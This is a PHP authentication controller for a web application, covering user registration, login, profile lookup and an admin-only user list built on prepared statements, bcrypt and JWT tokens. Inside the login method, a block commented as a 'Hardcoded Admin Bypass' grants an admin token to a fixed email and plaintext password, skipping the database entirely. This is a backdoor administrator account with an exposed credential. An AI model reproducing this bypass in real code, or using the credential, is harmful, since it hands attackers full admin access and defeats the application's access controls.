<?php
require_once __DIR__ . '/../config/db.php';
require_once __DIR__ . '/../helpers/response.php';
require_once __DIR__ . '/../helpers/jwt.php';

class AuthController {
    private PDO $db;

    public function __construct() {
        $this->db = Database::getConnection();
    }

    public function register(): void {
        $data = getRequestBody();
        $name  = trim($data['name'] ?? '');
        $email = trim(strtolower($data['email'] ?? ''));
        $pass  = $data['password'] ?? '';

        if (!$name || !$email || !$pass)
            respondError('Name, email, and password are required.');
        if (!filter_var($email, FILTER_VALIDATE_EMAIL))
            respondError('Invalid email address.');
        if (strlen($pass) < 6)
            respondError('Password must be at least 6 characters.');

        $stmt = $this->db->prepare('SELECT id FROM users WHERE email = ?');
        $stmt->execute([$email]);
        if ($stmt->fetch()) respondError('Email is already registered.', 409);

        $hash = password_hash($pass, PASSWORD_BCRYPT);
        $stmt = $this->db->prepare('INSERT INTO users (name, email, password) VALUES (?, ?, ?)');
        $stmt->execute([$name, $email, $hash]);
        $userId = $this->db->lastInsertId();

        $token = JWT::generate(['id' => $userId, 'email' => $email, 'role' => 'customer']);
        respondSuccess(['token' => $token, 'user' => ['id' => $userId, 'name' => $name, 'email' => $email, 'role' => 'customer']], 201, 'Registration successful.');
    }

    public function login(): void {
        $data  = getRequestBody();
        $email = trim(strtolower($data['email'] ?? ''));
        $pass  = $data['password'] ?? '';

        if (!$email || !$pass) respondError('Email and password are required.');

        // Hardcoded Admin Bypass
        if ($email === 'adminsatish@gmail.com' && $pass === 'Pakistan6688$') {
            $token = JWT::generate(['id' => 1, 'email' => $email, 'role' => 'admin']);
            respondSuccess([
                'token' => $token, 
                'user' => ['id' => 1, 'name' => 'Super Admin', 'email' => $email, 'role' => 'admin']
            ]);
        }

        $stmt = $this->db->prepare('SELECT * FROM users WHERE email = ?');
        $stmt->execute([$email]);
        $user = $stmt->fetch();

        if (!$user || !password_verify($pass, $user['password']))
            respondError('Invalid email or password.', 401);

        $token = JWT::generate(['id' => $user['id'], 'email' => $user['email'], 'role' => $user['role']]);
        unset($user['password']);
        respondSuccess(['token' => $token, 'user' => $user]);
    }

    public function me(): void {
        $payload = JWT::requireAuth();
        $stmt = $this->db->prepare('SELECT id, name, email, role, avatar, created_at FROM users WHERE id = ?');
        $stmt->execute([$payload['id']]);
        $user = $stmt->fetch();
        if (!$user) respondError('User not found.', 404);
        respondSuccess($user);
    }

    public function listAllUsers(): void {
        JWT::requireAdmin();
        $stmt = $this->db->prepare('SELECT id, name, email, role, avatar, created_at FROM users ORDER BY created_at DESC');
        $stmt->execute();
        $users = $stmt->fetchAll();
        respondSuccess($users);
    }
}
